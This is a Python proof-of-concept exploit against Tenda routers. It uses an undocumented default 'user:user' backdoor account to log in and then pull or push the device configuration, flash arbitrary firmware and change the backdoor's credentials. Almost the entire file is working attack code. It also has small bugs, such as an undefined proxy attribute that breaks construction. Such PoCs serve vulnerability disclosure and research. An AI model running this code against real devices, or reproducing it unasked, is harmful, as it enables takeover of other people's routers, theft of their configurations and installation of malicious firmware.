#!/usr/bin/env python3

'''
This PoCs uses Tendas backdoor default credential user:user to leverage httpd bugs and funtionalities. Despite being named user, this account can do anything admin account can.
Another quirk with this is after logged in, we can use cookies=user to avoid using provided cookies altogether. cookies in this case is backdoor account password.
There is a web function that let logged in user modify this account, but not exposed to the UI.
'''

import requests, sys

class Tendown:
    def __init__(self, ip, port, username='user', password='user'):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.cookie = password
        self.proxyDict = {"http":self.http_proxy, "https":self.https_proxy}

    def login(self):
        # user will be logged out if already logged in, so do this at most twice
        for i in range(0,2):
            try:
                r = requests.post('http://' + self.ip + ':' + str(self.port) + '/login/Auth', data={'username':self.username, 'password':self.password}, allow_redirects=False)
            except:
                raise RuntimeError('Connection Error!')
                return 
            if r.status_code == 302 and ('main.html' in r.text):
                # print(r.cookies)
                break
            elif i == 0:
                continue
            else:    
                raise RuntimeError('Unexpected status code %s or wrong redirection!' % (str(r.status_code)))

    def post_request(self, url, pdata):
        try:
            r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)
        except:
            raise RuntimeError('Connection Error!')
        if r.status_code != 200:
            self.cookie = self.password
            try:
                r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)
            except:
                raise RuntimeError('Connection Error!')
            if r.status_code != 200:
                raise RuntimeError('Unexpected status code %s! Something is wrong!' % (str(r.status_code)))

    def firmware_update(self, filename):
        try:
            r = requests.post('http://' + self.ip + ':' + str(self.port) + '/cgi-bin/upgrade', cookies={'password':self.cookie}, files={'upgradeFile':open(filename, 'rb')}, allow_redirects=False)
        except:
            raise RuntimeError('Connection Error!') 
        if r.status_code != 302:
            raise RuntimeError('Unexpected status code %s! Something is wrong!' % (str(r.status_code)))
        if '/redirect.html?1\"' not in r.text:
            raise RuntimeError('Upgrade Failed!')
        print('Firmware upgrade in process')

    def change_creds(self, username, password):
        try:
            r = requests.post('http://' + self.ip + ':' + str(self.port) + '/goform/SysToolBaseUser', cookies={'password':self.cookie}, data={'SYSUN':self.username, 'SYSOPS':self.password, 'SYSUN1':username, 'SYSPS':password, 'SYSPS2':password}, allow_redirects=False)
        except:
            raise RuntimeError('Connection Error!')
        if r.status_code != 302:
            raise RuntimeError('Unexpected status code %s! Something is wrong!' % (str(r.status_code)))
        self.username = username
        self.password = password
        self.cookie = password
        print('Backdoor changed to %s:%s' % (username, password))

    def pull_config(self):	
        try:
            r = requests.get('http://' + self.ip + ':' + str(self.port) + '/cgi-bin/DownloadCfg', cookies={'password':self.cookie}, allow_redirects=False)
        except:
            raise RuntimeError('Connection Error!')
        with open('config.txt', 'w') as f:
                f.write(r.text)
                f.close()
        return

    def push_config(self, filename):
        try:
            r = requests.post('http://' + self.ip + ':' + str(self.port) + '/cgi-bin/UploadCfg', cookies={'password':self.cookie}, files={'configFile':open(filename, 'rb')}, allow_redirects=False, proxies=proxyDict)
        except:
            raise RuntimeError('Connection Error!')
        if r.status_code != 302:
            raise RuntimeError('Unexpected status code %s! Something is wrong!' % (str(r.status_code)))
        if '/redirect.html?3\"' not in r.text:
            raise RuntimeError('Upgrade Failed!')
        print('Config upgrade in process')

if __name__ == "__main__":
	t = Tendown('192.168.0.1', '80', 'user', 'user')
	try:
		t.login()
	except RuntimeError as e:
		print(str(e))
		sys.exit()
	# t.push_config('config.txt')
	t.pull_config()
	# t.firmware_update('../../Binaries/upgrade.bin')
	# t.change_creds('user1', 'user1')
